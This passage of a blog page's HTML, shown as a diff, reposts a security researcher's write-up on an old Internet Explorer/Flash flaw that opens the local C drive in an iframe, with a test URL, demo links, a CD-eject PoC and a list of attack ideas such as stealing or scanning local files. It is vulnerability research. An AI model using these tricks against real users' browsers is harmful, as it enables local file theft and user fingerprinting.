!important;width:auto !important;box-sizing:content-box !important;font-size:1em !important;direction:ltr !important;white-space:pre !important;"><code>&amp;#42</code></div><br></div><br></td><br></tr><br></tbody><br></table><br></div><br></div>
+
+<p>Playing with backslashes without using “jar:” protocol ? Opens C drive:</p>
+<div style="color:#555555;font-family:Arial, Tahoma, Verdana;line-height:20px;"><div id="highlighter_486360" class="syntaxhighlighter plain" style="width:630px;margin:1em 0px !important;position:relative !important;overflow-x:auto !important;overflow-y:hidden !important;font-size:1em !important;background-color:black !important;"><table border="0" cellpadding="0" cellspacing="0" style="width:630px;border:0px !important;margin:0px !important;border-top-left-radius:0px !important;border-top-right-radius:0px !important;border-bottom-right-radius:0px !important;border-bottom-left-radius:0px !important;background-image:none !important;bottom:auto !important;float:none !important;height:auto !important;left:auto !important;line-height:1.1em !important;outline:0px !important;overflow:visible !important;padding:0px !important;position:static !important;right:auto !important;top:auto !important;vertical-align:baseline !important;box-sizing:content-box !important;font-family:Consolas, ’Bitstream Vera Sans Mono’, ’Courier New’, Courier, monospace !important;font-size:1em !important;direction:ltr !important;" class="ke-zeroborder"><tbody style="border-top-left-radius:0px !important;border-top-right-radius:0px !important;border-bottom-right-radius:0px !important;border-bottom-left-radius:0px !important;background-image:none !important;border:0px !important;bottom:auto !important;float:none !important;height:auto !important;left:auto !important;line-height:1.1em !important;margin:0px !important;outline:0px !important;overflow:visible !important;padding:0px !important;position:static !important;right:auto !important;top:auto !important;vertical-align:baseline !important;width:auto !important;box-sizing:content-box !important;font-size:1em !important;direction:ltr !important;"><tr style="border-top-left-radius:0px !important;border-top-right-radius:0px !important;border-bottom-right-radius:0px !important;border-bottom-left-radius:0px !important;background-image:none !important;border:0px !important;bottom:auto !important;float:none !important;height:auto !important;left:auto !important;line-height:1.1em !important;margin:0px !important;outline:0px !important;overflow:visible !important;padding:0px !important;position:static !important;right:auto !important;top:auto !important;vertical-align:baseline !important;width:auto !important;box-sizing:content-box !important;font-size:1em !important;direction:ltr !important;"><td class="gutter" style="border:0px !important;padding:0px !important;border-top-left-radius:0px !important;border-top-right-radius:0px !important;border-bottom-right-radius:0px !important;border-bottom-left-radius:0px !important;background-image:none !important;bottom:auto !important;float:none !important;height:auto !important;left:auto !important;line-height:1.1em !important;margin:0px !important;outline:0px !important;overflow:visible !important;position:static !important;right:auto !important;top:auto !important;vertical-align:baseline !important;width:auto !important;box-sizing:content-box !important;font-family:Consolas, ’Bitstream Vera Sans Mono’, ’Courier New’, Courier, monospace !important;font-size:1em !important;direction:ltr !important;color:#d3d3d3 !important;"><div class="line number1 index0 alt2" style="border-top-left-radius:0px !important;border-top-right-radius:0px !important;border-bottom-right-radius:0px !important;border-bottom-left-radius:0px !important;background-image:none !important;border-width:0px 3px 0px 0px !important;border-right-style:solid !important;border-right-color:#990000 !important;bottom:auto !important;float:none !important;height:auto !important;left:auto !important;line-height:1.1em !important;margin:0px !important;outline:0px !important;overflow:visible !important;padding:0px 0.5em 0px 1em !important;position:static !important;right:auto !important;text-align:right !important;top:auto !important;vertical-align:baseline !important;width:auto !important;box-sizing:content-box !important;font-size:1em !important;direction:ltr !important;white-space:pre !important;">1</div><br><div class="line number2 index1 alt1" style="border-top-left-radius:0px !important;border-top-right-radius:0px !important;border-bottom-right-radius:0px !important;border-bottom-left-radius:0px !important;background-image:none !important;border-width:0px 3px 0px 0px !important;border-right-style:solid !important;border-right-color:#990000 !important;bottom:auto !important;float:none !important;height:auto !important;left:auto !important;line-height:1.1em !important;margin:0px !important;outline:0px !important;overflow:visible !important;padding:0px 0.5em 0px 1em !important;position:static !important;right:auto !important;text-align:right !important;top:auto !important;vertical-align:baseline !important;width:auto !important;box-sizing:content-box !important;font-size:1em !important;direction:ltr !important;white-space:pre !important;">2</div><br><div class="line number3 index2 alt2" style="border-top-left-radius:0px !important;border-top-right-radius:0px !important;border-bottom-right-radius:0px !important;border-bottom-left-radius:0px !important;background-image:none !important;border-width:0px 3px 0px 0px !important;border-right-style:solid !important;border-right-color:#990000 !important;bottom:auto !important;float:none !important;height:auto !important;left:auto !important;line-height:1.1em !important;margin:0px !important;outline:0px !important;overflow:visible !important;padding:0px 0.5em 0px 1em !important;position:static !important;right:auto !important;text-align:right !important;top:auto !important;vertical-align:baseline !important;width:auto !important;box-sizing:content-box !important;font-size:1em !important;direction:ltr !important;white-space:pre !important;">3</div><br><div class="line number4 index3 alt1" style="border-top-left-radius:0px !important;border-top-right-radius:0px !important;border-bottom-right-radius:0px !important;border-bottom-left-radius:0px !important;background-image:none !important;border-width:0px 3px 0px 0px !important;border-right-style:solid !important;border-right-color:#990000 !important;bottom:auto !important;float:none !important;height:auto !important;left:auto !important;line-height:1.1em !important;margin:0px !important;outline:0px !important;overflow:visible !important;padding:0px 0.5em 0px 1em !important;position:static !important;right:auto !important;text-align:right !important;top:auto !important;vertical-align:baseline !important;width:auto !important;box-sizing:content-box !important;font-size:1em !important;direction:ltr !important;white-space:pre !important;">4</div><br><div class="line number5 index4 alt2" style="border-top-left-radius:0px !important;border-top-right-radius:0px !important;border-bottom-right-radius:0px !important;border-bottom-left-radius:0px !important;background-image:none !important;border-width:0px 3px 0px 0px !important;border-right-style:solid !important;border-right-color:#990000 !important;bottom:auto !important;float:none !important;height:auto !important;left:auto !important;line-height:1.1em !important;margin:0px !important;outline:0px !important;overflow:visible !important;padding:0px 0.5em 0px 1em !important;position:static !important;right:auto !important;text-align:right !important;top:auto !important;vertical-align:baseline !important;width:auto !important;box-sizing:content-box !important;font-size:1em !important;direction:ltr !important;white-space:pre !important;">5</div><br></td><br><td class="code" style="width:602.6666870117188px;border:0px !important;padding:0px !important;border-top-left-radius:0px !important;border-top-right-radius:0px !important;border-bottom-right-radius:0px !important;border-bottom-left-radius:0px !important;background-image:none !important;bottom:auto !important;float:none !important;height:auto !important;left:auto !important;line-height:1.1em !important;margin:0px !important;outline:0px !important;overflow:visible !important;position:static !important;right:auto !important;top:auto !important;vertical-align:baseline !important;box-sizing:content-box !important;font-family:Consolas, ’Bitstream Vera Sans Mono’, ’Courier New’, Courier, monospace !important;font-size:1em !important;direction:ltr !important;"><div class="container" style="border-top-left-radius:0px !important;border-top-right-radius:0px !important;border-bottom-right-radius:0px !important;border-bottom-left-radius:0px !important;background-image:none !important;border:0px !important;bottom:auto !important;float:none !important;height:auto !important;left:auto !important;line-height:1.1em !important;margin:0px !important;outline:0px !important;overflow:visible !important;padding:0px !important;position:relative !important;right:auto !important;top:auto !important;vertical-align:baseline !important;width:auto !important;box-sizing:content-box !important;font-size:1em !important;direction:ltr !important;"><div class="line number1 index0 alt2" style="border-top-left-radius:0px !important;border-top-right-radius:0px !important;border-bottom-right-radius:0px !important;border-bottom-left-radius:0px !important;background-image:none !important;border:0px !important;bottom:auto !important;float:none !important;height:auto !important;left:auto !important;line-height:1.1em !important;margin:0px !important;outline:0px !important;overflow:visible !important;padding:0px 1em !important;position:static !important;right:auto !important;top:auto !important;vertical-align:baseline !important;width:auto !important;box-sizing:content-box !important;font-size:1em !important;direction:ltr !important;white-space:pre !important;"><code>&amp;#42</code></div><br><div class="line number2 index1 alt1" style="border-top-left-radius:0px !important;border-top-right-radius:0px !important;border-bottom-right-radius:0px !important;border-bottom-left-radius:0px !important;background-image:none !important;border:0px !important;bottom:auto !important;float:none !important;height:auto !important;left:auto !important;line-height:1.1em !important;margin:0px !important;outline:0px !important;overflow:visible !important;padding:0px 1em !important;position:static !important;right:auto !important;top:auto !important;vertical-align:baseline !important;width:auto !important;box-sizing:content-box !important;font-size:1em !important;direction:ltr !important;white-space:pre !important;">&nbsp;</div><br><div class="line number3 index2 alt2" style="border-top-left-radius:0px !important;border-top-right-radius:0px !important;border-bottom-right-radius:0px !important;border-bottom-left-radius:0px !important;background-image:none !important;border:0px !important;bottom:auto !important;float:none !important;height:auto !important;left:auto !important;line-height:1.1em !important;margin:0px !important;outline:0px !important;overflow:visible !important;padding:0px 1em !important;position:static !important;right:auto !important;top:auto !important;vertical-align:baseline !important;width:auto !important;box-sizing:content-box !important;font-size:1em !important;direction:ltr !important;white-space:pre !important;"><code>http://0me.me/demo/xss/flash/link_protocol_test.swf?input=\/c:/</code></div><br><div class="line number4 index3 alt1" style="border-top-left-radius:0px !important;border-top-right-radius:0px !important;border-bottom-right-radius:0px !important;border-bottom-left-radius:0px !important;background-image:none !important;border:0px !important;bottom:auto !important;float:none !important;height:auto !important;left:auto !important;line-height:1.1em !important;margin:0px !important;outline:0px !important;overflow:visible !important;padding:0px 1em !important;position:static !important;right:auto !important;top:auto !important;vertical-align:baseline !important;width:auto !important;box-sizing:content-box !important;font-size:1em !important;direction:ltr !important;white-space:pre !important;">&nbsp;</div><br><div class="line number5 index4 alt2" style="border-top-left-radius:0px !important;border-top-right-radius:0px !important;border-bottom-right-radius:0px !important;border-bottom-left-radius:0px !important;background-image:none !important;border:0px !important;bottom:auto !important;float:none !important;height:auto !important;left:auto !important;line-height:1.1em !important;margin:0px !important;outline:0px !important;overflow:visible !important;padding:0px 1em !important;position:static !important;right:auto !important;top:auto !important;vertical-align:baseline !important;width:auto !important;box-sizing:content-box !important;font-size:1em !important;direction:ltr !important;white-space:pre !important;"><code>&amp;#42</code></div><br></div><br></td><br></tr><br></tbody><br></table><br></div><br></div>
+
+<p><a href="http://0me.me/demo/xss/flash/iframe_link_protocol_test.html" target="_blank" rel="noopener">http://0me.me/demo/xss/flash/iframe_link_protocol_test.html</a>&nbsp;</p>
+<p>然后下面就是作者的总结的一些思路扩展：</p>
+<p><strong>These are the things we should be able to do by opening the local file system in an IFrame:</strong></p>
+<p>1- Running a dangerous browser readable file (such as html, swf, and so on) that contains malicious scripts to steal more data, execute command, or target the internal network. In order to exploit this issue, you need a vulnerable/malicious file with proper extension (IE should be able to open it) in the target’s machine. This can be an existent file or a file that has been downloaded to the target. However, you may need the user’s interaction (see this old issue:&nbsp;<a href="http://forums.cnet.com/7726-6132_102-5480227.html" target="_blank" rel="noopener">http://forums.cnet.com/7726-6132_102-5480227.html</a>).</p>
+<p>2- Hijacking the local sensitive files by using drag-and-drop feature. I should say that I was unable to do this in my PoCs. Maybe I should try harder?!</p>
+<p>3- Scanning the local resources.</p>
+<p>4- Fingerprinting the users based on their files and directories.</p>
+<h3 id="Let’s-have-some-fun-I-want-to-open-your-CDRom"><a href="#Let’s-have-some-fun-I-want-to-open-your-CDRom" class="headerlink" title="Let’s have some fun! I want to open your CDRom!"></a><strong>Let’s have some fun! I want to open your CDRom!</strong></h3><p>I have created a PoC to eject the empty CD/DVD drives in IE (tested in IE10) ? just like old Trojans!!!:</p>
+<p><a href="http://0me.me/demo/xss/flash/open_cdrom.html" target="_blank" rel="noopener">http://0me.me/demo/xss/flash/open_cdrom.html</a></p>
+<p>I have used another&nbsp;<a href="http://soroush.secproject.com/blog/2013/04/microsoft-xmldom-in-ie-can-divulge-information-of-local-drivenetwork-in-error-messages/" target="_blank" rel="noopener">advisory of mine</a>&nbsp;to enumerate the valid Drive letters and I am opening them one by one in an IFrame!</p>
+<p>&nbsp;</p>
+</div></td>
+      
+    </div>
+    
+    
+    
+
+    
+
+    
+
+    
+
+    <footer class="post-footer">
+      
+        <div class="post-tags">
+          
+            <a href="/tags/xss/" rel="tag"># xss</a>
+          
+            <a href="/tags/flash/" rel="tag"># flash</a>
+          
+        </div>
+      
+
+      
+      
+      
+
+      
+        <div class="post-nav">
+          <div class="post-nav-next post-nav-item">
+            
+              <a href="/2013/10/05/读书笔记/" rel="next" title="读书笔记">
+                <i class="fa fa-chevron-left"></i> 读书笔记
+              </a>
+            
+          </div>
+
+          <span class="post-nav-divider"></span>
+
+          <div class="post-nav-prev post-nav-item">
+            
+              <a href="/2014/01/03/一个加密脚本，达到一定免杀效果/" rel="prev" title="一个加密脚本，达到一定免杀效果">
+                一个加密脚本，达到一定免杀效果 <i class="fa fa-chevron-right"></i>
+              </a>
+            
+          </div>
+        </div>
+      
+
+      
+      
+    </footer>
+  </div>
+  
+  
+  
+  </article>
+
+
+
+    <div class="post-spread">
+      
+    </div>
+  </div>
+
+
+          </div>
+          
+
+
+          
+
+  
+
+
+
+        </div>
+        
+          
+  
+  <div class="sidebar-toggle">
+    <div class="sidebar-toggle-line-wrap">
+      <span class="sidebar-toggle-line sidebar-toggle-line-first"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-middle"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-last"></span>
+    </div>
+  </div>
+
+  <aside id="sidebar" class="sidebar">
+    
+    <div class="sidebar-inner">
+
+      
+
+      
+        <ul class="sidebar-nav motion-element">
+          <li class="sidebar-nav-toc sidebar-nav-active" data-target="post-toc-wrap">
+            Inhaltsverzeichnis
+          </li>
+          <li class="sidebar-nav-overview" data-target="site-overview-wrap">
+            Übersicht
+          </li>
+        </ul>
+      
+
+      <section class="site-overview-wrap sidebar-panel">
+        <div class="site-overview">
+          <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
+            
+              <p class="site-author-name" itemprop="name">John Doe</p>
+              <p class="site-description motion-element" itemprop="description"></p>
+          </div>
+
+          <nav class="site-state motion-element">
+
+            
+              <div class="site-state-item site-state-posts">
+              
+                <a href="/archives/">
+              
+                  <span class="site-state-item-count">165</span>
+                  <span class="site-state-item-name">Artikel</span>
+                </a>
+              </div>
+            
+
+            
+              
+              
+              <div class="site-state-item site-state-categories">
+                
+                  <span class="site-state-item-count">14</span>
+                  <span class="site-state-item-name">Kategorien</span>
+                
+              </div>
+            
+
+            
+              
+              
+              <div class="site-state-item site-state-tags">
+                
+                  <span class="site-state-item-count">183</span>
+                  <span class="site-state-item-name">Tags</span>
+                
+              </div>
+            
+
+          </nav>
+
+          
+
+          
+
+          
+          
+
+          
+          
+
+          
+
+        </div>
+      </section>
+
+      
+      <!--noindex-->
+        <section class="post-toc-wrap motion-element sidebar-panel sidebar-panel-active">
+          <div class="post-toc">
+
+            
+              
+            
+
+            
+              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-3"><a class="nav-link" href="#Let’s-have-some-fun-I-want-to-open-your-CDRom"><span class="nav-number">1.</span> <span class="nav-text">Let’s have some fun! I want to open your CDRom!</span></a></li></ol></div>
+            
+
+          </div>
+        </section>
+      <!--/noindex-->
+      
+
+      
+
+    </div>
+  </aside>
+
+
+        
+      </div>
+    </main>
+
+    <footer id="footer" class="footer">
+      <div class="footer-inner">
+        <div class="copyright">&copy; <span itemprop="copyrightYear">2018</span>
+  <span class="with-love">
+    <i class="fa fa-user"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">John Doe</span>
+
+  
+</div>
+
+
+  <div class="powered-by">Erstellt mit  <a class="theme-link" target="_blank" href="https://hexo.io">Hexo</a></div>
+
+
+
+  <span class="post-meta-divider">|</span>
+
+
+
+  <div class="theme-info">Theme &mdash; <a class="theme-link" target="_blank" href="https://github.com/iissnan/hexo-theme-next">NexT.Muse</a> v5.1.4</div>
+
+
+
+
+        
+
+
+
+
+
+
+
+        
+      </div>
+    </footer>
+
+    
+      <div class="back-to-top">
+        <i class="fa fa-arrow-up"></i>
+        
+      </div>
+    
+
+    
+
+  </div>
+
+  
+
+<script type="text/javascript">
+  if (Object.prototype.toString.call(window.Promise) !== '[object Function]') {
+    window.Promise = null;
+  }
+</script>
+
+
+
+
+
+
+
+
+
+  
+
+
+
+
+
+
+
+
+
+
+
+
+  
+  
+    <script type="text/javascript" src="/lib/jquery/index.js?v=2.1.3"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/fastclick/lib/fastclick.min.js?v=1.0.6"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/jquery_lazyload/jquery.lazyload.js?v=1.9.7"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/velocity/velocity.min.js?v=1.2.1"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/velocity/velocity.ui.min.js?v=1.2.1"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/fancybox/source/jquery.fancybox.pack.js?v=2.1.5"></script>
+  
+
+
+  
+
+
+  <script type="text/javascript" src="/js/src/utils.js?v=5.1.4"></script>
+
+  <script type="text/javascript" src="/js/src/motion.js?v=5.1.4"></script>
+
+
+
+  
+  
+
+  
+  <script type="text/javascript" src="/js/src/scrollspy.js?v=5.1.4"></script>
+<script type="text/javascript" src="/js/src/post-details.js?v=5.1.4"></script>
+
+
+
+  
+
+
+  <script type="text/javascript" src="/js/src/bootstrap.js?v=5.1.4"></script>
+
+
+
+  
+
+
+  
+
+
+
+
+	
+
+
+
+
+
+  
+
+
+
+
+
+  
+
+
+
+
+
+
+
+
+
+
+
+
+  
+
+
+
+
+
+  
+
+  
+
+  
+
+  
+  
+
+  
+
+  
+
+  
+
+</body>
+</html>
